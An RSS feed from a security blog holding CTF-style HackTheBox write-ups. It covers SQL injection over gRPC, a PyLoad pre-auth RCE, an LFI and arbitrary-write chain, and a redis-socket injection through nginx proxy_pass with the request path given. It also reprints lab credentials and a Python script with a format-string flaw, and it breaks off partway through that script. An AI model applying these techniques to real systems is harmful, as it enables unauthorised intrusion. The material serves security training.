<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator><link href="https://4g3nt47.github.io/rss/feed.xml" rel="self" type="application/atom+xml" /><link href="https://4g3nt47.github.io/" rel="alternate" type="text/html" hreflang="en" /><updated>2023-10-07T17:23:08+01:00</updated><id>https://4g3nt47.github.io/rss/feed.xml</id><title type="html">4g3nt47</title><subtitle>A blog for infosec stuff.</subtitle><entry><title type="html">PC - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/pc.html" rel="alternate" type="text/html" title="PC - HackTheBox" /><published>2023-10-07T00:00:00+01:00</published><updated>2023-10-07T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/pc</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/pc.html"><![CDATA[<p><strong>PC</strong> is an easy linux machine on <em>HackTheBox</em>. It starts with exploiting an <em>SQL injection</em> vulnerability on an open RPC service to dump a user password. Once inside, you will have access to a local instance of <em>PyLoad</em> that has a pre-auth RCE CVE, which will give you access as <code class="language-plaintext highlighter-rouge">root</code>.</p>

<p><br /></p>

<h3 id="info">Info</h3>
<p><br /></p>

<p><img src="/assets/img/Pasted image 20230831123309.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230831123333.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="recon">Recon</h3>
<p><br /></p>

<h4 id="nmap">NMAP</h4>
<p><br /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre># Nmap 7.80 scan initiated Tue Aug 15 23:21:43 2023 as: nmap -sC -sV -p22,50051 -v -Pn -oN nmap.txt 10.10.11.214
Nmap scan report for 10.10.11.214
Host is up (0.17s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
50051/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port50051-TCP:V=7.80%I=7%D=8/15%Time=64DBFA80%P=x86_64-pc-linux-gnu%r(N
---[snip]---
SF:0\0\0\0\0\?\0\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Aug 15 23:22:09 2023 -- 1 IP address (1 host up) scanned in 25.77 seconds
</pre></td></tr></tbody></table></code></pre></div></div>

<p><br /></p>

<h4 id="port-50051">Port 50051</h4>
<p><br /></p>

<p>Connecting to this service using <code class="language-plaintext highlighter-rouge">netcat</code> gave a weird response;</p>

<p><img src="/assets/img/Pasted image 20230831123948.png" alt="" /></p>

<p>Googling about this port number and the response found <a href="https://github.com/grpc/grpc-node/issues/1416">something</a>;</p>

<p><img src="/assets/img/Pasted image 20230831124131.png" alt="" /></p>

<p>This identifies the service as <a href="https://grpc.io/"><strong>gRPC</strong></a>;</p>
<blockquote>
  <p>gRPC is a modern open source high performance Remote Procedure Call (RPC) framework that can run in any environment. It can efficiently connect services in and across data centers with pluggable support for load balancing, tracing, health checking and authentication. It is also applicable in last mile of distributed computing to connect devices, mobile applications and browsers to backend services.</p>
</blockquote>

<p>Looking for tools to interact with it, I found <a href="https://medium.com/@ibm_ptc_security/grpc-security-series-part-3-c92f3b687dd9">this blog post</a>, which did a great job of explaining the protocol. I installed <a href="https://github.com/fullstorydev/grpcurl">grpcurl</a> and connect the web UI to the service;</p>

<p><img src="/assets/img/Pasted image 20230831125146.png" alt="" />
<img src="/assets/img/Pasted image 20230831125249.png" alt="" /></p>

<p>There is only 1 service and 3 methods defined;</p>

<p><img src="/assets/img/Pasted image 20230831125337.png" alt="" /></p>

<p>I created an account using the <code class="language-plaintext highlighter-rouge">RegisterUser</code> function, and was able to login;</p>

<p><img src="/assets/img/Pasted image 20230831125420.png" alt="" />
<img src="/assets/img/Pasted image 20230831125524.png" alt="" /></p>

<p>I was issued a token after login;</p>

<p><img src="/assets/img/Pasted image 20230831125622.png" alt="" /></p>

<p>Invoking <code class="language-plaintext highlighter-rouge">getInfo</code> with the token and ID;</p>

<p><img src="/assets/img/Pasted image 20230831125930.png" alt="" /></p>

<p>This is the requested generated;</p>

<p><img src="/assets/img/Pasted image 20230831130828.png" alt="" /></p>

<p>Playing with the request, I got an error message after adding a single quote to the <code class="language-plaintext highlighter-rouge">id</code> parameter;</p>

<p><img src="/assets/img/Pasted image 20230831131016.png" alt="" /></p>

<p>Giving it to <code class="language-plaintext highlighter-rouge">sqlmap</code>, it flagged it as vulnerable, and was able to dump the database;</p>

<p><img src="/assets/img/Pasted image 20230831131613.png" alt="" />
<img src="/assets/img/Pasted image 20230831131656.png" alt="" /></p>

<p>I was able to SSH into the box using <code class="language-plaintext highlighter-rouge">sau:HereIsYourPassWord1431</code>;</p>

<p><img src="/assets/img/Pasted image 20230831131741.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="privesc">PrivEsc</h3>
<p><br /></p>

<p><code class="language-plaintext highlighter-rouge">sau</code> does not have sudo perms, and is not in any group. There is some service running locally on port <strong>8000</strong>;</p>

<p><img src="/assets/img/Pasted image 20230831132016.png" alt="" /></p>

<p>I setup an SSH tunnel to it and scanned it with NMAP;</p>

<p><img src="/assets/img/Pasted image 20230831132240.png" alt="" /></p>

<p>Loading up the page;</p>

<p><img src="/assets/img/Pasted image 20230831132332.png" alt="" /></p>

<p>Trying the creds of <code class="language-plaintext highlighter-rouge">sau</code> didn’t work. <code class="language-plaintext highlighter-rouge">searchsploit</code> showed it has a pre-auth RCE;</p>

<p><img src="/assets/img/Pasted image 20230831132537.png" alt="" /></p>

<p>Using the exploit, I got a shell on the box as <code class="language-plaintext highlighter-rouge">root</code>;</p>

<p><img src="/assets/img/Pasted image 20230831132941.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>NMAP discovered port <strong>22</strong>, and <strong>50051</strong> (gRPC)</li>
  <li>Used <code class="language-plaintext highlighter-rouge">grpcurl</code> to interact with the service;
    <ul>
      <li><code class="language-plaintext highlighter-rouge">getInfo</code> method vulnerable to SQL injection.</li>
      <li>Used it to leak some creds from the DB, which gave me SSH access as <code class="language-plaintext highlighter-rouge">sau</code></li>
    </ul>
  </li>
  <li>Inside the box as <code class="language-plaintext highlighter-rouge">sau</code>;
    <ul>
      <li>Setup a tunnel to local <code class="language-plaintext highlighter-rouge">PyLoad</code> instance</li>
      <li>Exploit pre-auth RCE to gain a shell as <code class="language-plaintext highlighter-rouge">root</code></li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hacthebox" /><category term="easy" /><category term="linux" /><category term="RPC" /><category term="gRPC" /><category term="grpcurl" /><category term="grpcui" /><category term="sql injection" /><category term="pyload" /><summary type="html"><![CDATA[PC is an easy linux machine on HackTheBox. It starts with exploiting an SQL injection vulnerability on an open RPC service to dump a user password. Once inside, you will have access to a local instance of PyLoad that has a pre-auth RCE CVE, which will give you access as root.]]></summary></entry><entry><title type="html">Format - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/format.html" rel="alternate" type="text/html" title="Format - HackTheBox" /><published>2023-09-30T00:00:00+01:00</published><updated>2023-09-30T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/format</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/format.html"><![CDATA[<p><strong>Format</strong> is a nice <em>medium</em> linux machine on <em>HackTheBox</em>. It features a custom web application for creating blogs that is vulnerable to arbitrary read and write, which is easy to detect as the full application source code is accessible in a public <em>Gitea</em> repo. Once inside, you’ll be recovering some creds from the backend redis server, and exploiting a <em>format string</em> vulnerability in a python program to gain <code class="language-plaintext highlighter-rouge">root</code>.</p>

<p><br /></p>

<h3 id="format">Format</h3>
<p><br /></p>

<p><img src="/assets/img/Pasted image 20230901194402.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230901194425.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="recon">Recon</h3>
<p><br /></p>

<h4 id="nmap">NMAP</h4>
<p><br /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td><td class="rouge-code"><pre># Nmap 7.80 scan initiated Wed Aug 23 11:38:22 2023 as: nmap -sC -sV -oN nmap.txt -v 10.10.11.213
Nmap scan report for 10.10.11.213
Host is up (0.50s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp   open  http    nginx 1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.18.0
|_http-title: Site doesn't have a title (text/html).
3000/tcp open  http    nginx 1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://microblog.htb:3000/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Aug 23 11:39:36 2023 -- 1 IP address (1 host up) scanned in 73.75 seconds
</pre></td></tr></tbody></table></code></pre></div></div>

<p><br /></p>

<h4 id="web">Web</h4>
<p><br />
A very neat looking web app for bloggers;</p>

<p><img src="/assets/img/Pasted image 20230901195129.png" alt="" /></p>

<p>Was able to register an account and login;</p>

<p><img src="/assets/img/Pasted image 20230901195253.png" alt="" /></p>

<p>Created a blog named <code class="language-plaintext highlighter-rouge">testing</code>, which interestingly spawned a new subdomain on the site;</p>

<p><img src="/assets/img/Pasted image 20230901195323.png" alt="" />
<img src="/assets/img/Pasted image 20230901195414.png" alt="" /></p>

<p>Going to the <code class="language-plaintext highlighter-rouge">edit</code> link, we were given options to add contents to the blog;</p>

<p><img src="/assets/img/Pasted image 20230901195530.png" alt="" /></p>

<p><br /></p>

<h4 id="gitea">Gitea</h4>
<p><br /></p>

<p>Port <code class="language-plaintext highlighter-rouge">3000</code> is running <em>Gitea</em>, and one public repo was found;</p>

<p><img src="/assets/img/Pasted image 20230901195745.png" alt="" /></p>

<p>This seems to contain the source code of the blogging web app, so I downloaded it for analysis;</p>

<p><img src="/assets/img/Pasted image 20230901195842.png" alt="" /></p>

<p>Nothing special was found when going through previous commits. Going through the source code, the code used to register a user account showed the application using a <em>redis</em> server as backend database via a unix socket file, and there is a user setting named <code class="language-plaintext highlighter-rouge">pro</code>, which is set to <code class="language-plaintext highlighter-rouge">false</code> by default;</p>

<p><img src="/assets/img/Pasted image 20230901200530.png" alt="" /></p>

<p>The code for creating blogs showed they are stored in <code class="language-plaintext highlighter-rouge">/var/www/microblog/</code> + the name of the blog (which is strictly lowercase alphabets, so no room for code injection);</p>

<p><img src="/assets/img/Pasted image 20230901201103.png" alt="" /></p>

<p>No part of the code made any changes to <em>Nginx</em> config, so I am guessing it is somehow configured to serve all directories in that location as subdomains.</p>

<p>Going through the code used to add contents to the blog in the edits page, it is vulnerable to <em>arbitrary write</em> as no attempt was made to validate the value of the POST parameter <code class="language-plaintext highlighter-rouge">id</code> before it was opened as a file for writing;</p>

<p><img src="/assets/img/Pasted image 20230901201553.png" alt="" /></p>

<p>I tried to exploit this and write to the PHP files, but it didn’t work. This is because when creating a new blog, the template files were first made non-writable before being copied to their web directory using <code class="language-plaintext highlighter-rouge">cp -rp</code>, where the <code class="language-plaintext highlighter-rouge">p</code> preserves the permissions.</p>

<p>Notice the application is storing the <code class="language-plaintext highlighter-rouge">id</code> to a file named <code class="language-plaintext highlighter-rouge">order.txt</code>. This is the same file used by the application when building the page;</p>

<p><img src="/assets/img/Pasted image 20230901202619.png" alt="" /></p>

<p>This gives us an LFI vulnerability because even if we attempt to write to a file we can’t write to, the code won’t error out, and the filename will be stored in <code class="language-plaintext highlighter-rouge">order.txt</code>, which will be loaded when building the page. Testing this by setting <code class="language-plaintext highlighter-rouge">id</code> to <code class="language-plaintext highlighter-rouge">/etc/passwd</code> during edit, it worked;</p>

<p><img src="/assets/img/Pasted image 20230901202941.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="foothold">Foothold</h3>
<p><br /></p>

<p>With the LFI established, I am interested in how <em>Nginx</em> is configured in this box. Dumping the default config showed something interesting;</p>

<p><img src="/assets/img/Pasted image 20230901203912.png" alt="" /></p>

<p>Notice how the config uses parts of requested URL when routing using <code class="language-plaintext highlighter-rouge">proxy_pass</code>. For a request like <code class="language-plaintext highlighter-rouge">/static/dom/path</code>, this will resolve to <code class="language-plaintext highlighter-rouge">http://dom.microbucket.htb/path</code>.</p>

<p>We know the application is communicating with redis through a unix socket file, and that the data of each user is stored with the user’s username as key in the redis server;</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="nv">$redis</span><span class="o">-&gt;</span><span class="nf">HSET</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]),</span> <span class="s2">"username"</span><span class="p">,</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]));</span>
<span class="nv">$redis</span><span class="o">-&gt;</span><span class="nf">HSET</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]),</span> <span class="s2">"password"</span><span class="p">,</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]));</span>
<span class="nv">$redis</span><span class="o">-&gt;</span><span class="nf">HSET</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]),</span> <span class="s2">"first-name"</span><span class="p">,</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'first-name'</span><span class="p">]));</span>
<span class="nv">$redis</span><span class="o">-&gt;</span><span class="nf">HSET</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]),</span> <span class="s2">"last-name"</span><span class="p">,</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'last-name'</span><span class="p">]));</span>
<span class="nv">$redis</span><span class="o">-&gt;</span><span class="nf">HSET</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]),</span> <span class="s2">"pro"</span><span class="p">,</span> <span class="s2">"false"</span><span class="p">);</span> <span class="c1">//not ready yet, license keys coming soon</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">proxy_pass</code> command of Nginx can communicate with unix socket files using the <code class="language-plaintext highlighter-rouge">unix</code> protocol. Testing this, I was able to update my user <code class="language-plaintext highlighter-rouge">testuser</code> to <code class="language-plaintext highlighter-rouge">pro</code> by requesting the path <code class="language-plaintext highlighter-rouge">unix:/var/run/redis/redis.sock:testuser pro true /path</code>, which expands to <code class="language-plaintext highlighter-rouge">http://unix:/var/run/redis/redis.sock:testuser pro true .microbucket.htb/path</code>. Since we are still using the HTTP protocol, the request method, followed with everything after <code class="language-plaintext highlighter-rouge">redis.sock:</code> are writting to the socket;</p>

<p><img src="/assets/img/Pasted image 20230901210659.png" alt="" /></p>

<p>The above request sent <code class="language-plaintext highlighter-rouge">HSET testuser pro true</code> to our redis socket, likely with other inputs too which will simply be treated as invalid commands and ignored. This gave us <em>pro</em> access to the application;</p>

<p><img src="/assets/img/Pasted image 20230901210922.png" alt="" /></p>

<p>I now have access to the image upload feature, which creates a new <code class="language-plaintext highlighter-rouge">upload/</code> directory in the blog;</p>

<p><img src="/assets/img/Pasted image 20230901211714.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230901211728.png" alt="" /></p>

<p>The following code showed the <code class="language-plaintext highlighter-rouge">upload</code> directory is made writable when we have pro permissions;</p>

<p><img src="/assets/img/Pasted image 20230901212057.png" alt="" /></p>

<p>This means we could use the arbitrary write vulnerability discovered earlier to write PHP files into this directory. Testing this, I was able to gain code execution and a shell on the box;</p>

<p><img src="/assets/img/Pasted image 20230901212411.png" alt="" />
<img src="/assets/img/Pasted image 20230901212437.png" alt="" />
<img src="/assets/img/Pasted image 20230901212504.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="user">User</h3>
<p><br /></p>

<p>The box has <code class="language-plaintext highlighter-rouge">redis-cli</code> installed, so I used it to explore the redis server. I got a password;</p>

<p><img src="/assets/img/Pasted image 20230901212848.png" alt="" /></p>

<p>There is a local user named <code class="language-plaintext highlighter-rouge">cooper</code> on the box, so I tried login into his account, and it worked;</p>

<p><img src="/assets/img/Pasted image 20230901212949.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="privesc">PrivEsc</h3>
<p><br /></p>

<p><code class="language-plaintext highlighter-rouge">cooper</code> is not part of any special group, but he does have a sudo permission on a custom python script;</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>cooper@format:~$ sudo -l
Matching Defaults entries for cooper on format:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cooper may run the following commands on format:
    (root) /usr/bin/license
cooper@format:~$ file /usr/bin/license 
/usr/bin/license: Python script, ASCII text executable
cooper@format:~$ ~
</pre></td></tr></tbody></table></code></pre></div></div>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">from</span> <span class="nn">cryptography.hazmat.backends</span> <span class="kn">import</span> <span class="n">default_backend</span>
<span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives</span> <span class="kn">import</span> <span class="n">hashes</span>
<span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives.kdf.pbkdf2</span> <span class="kn">import</span> <span class="n">PBKDF2HMAC</span>
<span class="kn">from</span> <span class="nn">cryptography.fernet</span> <span class="kn">import</span> <span class="n">Fernet</span>
<span class="kn">import</span> <span class="nn">random</span>
<span class="kn">import</span> <span class="nn">string</span>
<span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">date</span>
<span class="kn">import</span> <span class="nn">redis</span>
<span class="kn">import</span> <span class="nn">argparse</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="k">class</span> <span class="nc">License</span><span class="p">():</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">chars</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">punctuation</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">license</span> <span class="o">=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="n">choice</span><span class="p">(</span><span class="n">chars</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">40</span><span class="p">))</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">created</span> <span class="o">=</span> <span class="n">date</span><span class="p">.</span><span class="n">today</span><span class="p">()</span>

<span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">geteuid</span><span class="p">()</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Microblog license key manager can only be run as root"</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>

<span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s">'Microblog license key manager'</span><span class="p">)</span>
<span class="n">group</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">add_mutually_exclusive_group</span><span class="p">(</span><span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
<span class="n">group</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-p'</span><span class="p">,</span> <span class="s">'--provision'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Provision license key for specified user'</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s">'username'</span><span class="p">)</span>
<span class="n">group</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-d'</span><span class="p">,</span> <span class="s">'--deprovision'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Deprovision license key for specified user'</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s">'username'</span><span class="p">)</span>
<span class="n">group</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-c'</span><span class="p">,</span> <span class="s">'--check'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Check if specified license key is valid'</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s">'license_key'</span><span class="p">)</span>
<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">redis</span><span class="p">.</span><span class="n">Redis</span><span class="p">(</span><span class="n">unix_socket_path</span><span class="o">=</span><span class="s">'/var/run/redis/redis.sock'</span><span class="p">)</span>

<span class="n">secret</span> <span class="o">=</span> <span class="p">[</span><span class="n">line</span><span class="p">.</span><span class="n">strip</span><span class="p">()</span> <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="nb">open</span><span class="p">(</span><span class="s">"/root/license/secret"</span><span class="p">)][</span><span class="mi">0</span><span class="p">]</span>
<span class="n">secret_encoded</span> <span class="o">=</span> <span class="n">secret</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>
<span class="n">salt</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'microblogsalt123'</span>
<span class="n">kdf</span> <span class="o">=</span> <span class="n">PBKDF2HMAC</span><span class="p">(</span><span class="n">algorithm</span><span class="o">=</span><span class="n">hashes</span><span class="p">.</span><span class="n">SHA256</span><span class="p">(),</span><span class="n">length</span><span class="o">=</span><span class="mi">32</span><span class="p">,</span><span class="n">salt</span><span class="o">=</span><span class="n">salt</span><span class="p">,</span><span class="n">iterations</span><span class="o">=</span><span class="mi">100000</span><span class="p">,</span><span class="n">backend</span><span class="o">=</span><span class="n">default_backend</span><span class="p">())</span>
<span class="n">encryption_key</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">urlsafe_b64encode</span><span class="p">(</span><span class="n">kdf</span><span class="p">.</span><span class="n">derive</span><span class="p">(</span><span class="n">secret_encoded</span><span class="p">))</span>

<span class="n">f</span> <span class="o">=</span> <span class="n">Fernet</span><span class="p">(</span><span class="n">encryption_key</span><span class="p">)</span>
<span class="n">l</span> <span class="o">=</span> <span class="n">License</span><span class="p">()</span>

<span class="c1">#provision
</span><span class="k">if</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">provision</span><span class="p">):</span>
    <span class="n">user_profile</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">hgetall</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">provision</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">user_profile</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"User does not exist. Please provide valid username."</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>
    <span class="n">existing_keys</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"/root/license/keys"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span>
    <span class="n">all_keys</span> <span class="o">=</span> <span class="n">existing_keys</span><span class="p">.</span><span class="n">readlines</span><span class="p">()</span>
    <span class="k">for</span> <span class="n">user_key</span> <span class="ow">in</span> <span class="n">all_keys</span><span class="p">:</span>
        <span class="k">if</span><span class="p">(</span><span class="n">user_key</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">":"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">args</span><span class="p">.</span><span class="n">provision</span><span class="p">):</span>
            <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
            <span class="k">print</span><span class="p">(</span><span class="s">"License key has already been provisioned for this user"</span><span class="p">)</span>
            <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
            <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>
    <span class="n">prefix</span> <span class="o">=</span> <span class="s">"microblog"</span>
    <span class="n">username</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">hget</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">provision</span><span class="p">,</span> <span class="s">"username"</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span>
    <span class="n">firstlast</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">hget</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">provision</span><span class="p">,</span> <span class="s">"first-name"</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span> <span class="o">+</span> <span class="n">r</span><span class="p">.</span><span class="n">hget</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">provision</span><span class="p">,</span> <span class="s">"last-name"</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span>
    <span class="n">license_key</span> <span class="o">=</span> <span class="p">(</span><span class="n">prefix</span> <span class="o">+</span> <span class="n">username</span> <span class="o">+</span> <span class="s">"{license.license}"</span> <span class="o">+</span> <span class="n">firstlast</span><span class="p">).</span><span class="nb">format</span><span class="p">(</span><span class="n">license</span><span class="o">=</span><span class="n">l</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Plaintext license key:"</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"------------------------------------------------------"</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">license_key</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
    <span class="n">license_key_encoded</span> <span class="o">=</span> <span class="n">license_key</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>
    <span class="n">license_key_encrypted</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">license_key_encoded</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Encrypted license key (distribute to customer):"</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"------------------------------------------------------"</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">license_key_encrypted</span><span class="p">.</span><span class="n">decode</span><span class="p">())</span>
    <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"/root/license/keys"</span><span class="p">,</span> <span class="s">"a"</span><span class="p">)</span> <span class="k">as</span> <span class="n">license_keys_file</span><span class="p">:</span>
        <span class="n">license_keys_file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">provision</span> <span class="o">+</span> <span class="s">":"</span> <span class="o">+</span> <span class="n">license_key_encrypted</span><span class="p">.</span><span class="n">decode</span><span class="p">()</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>

<span class="c1">#deprovision
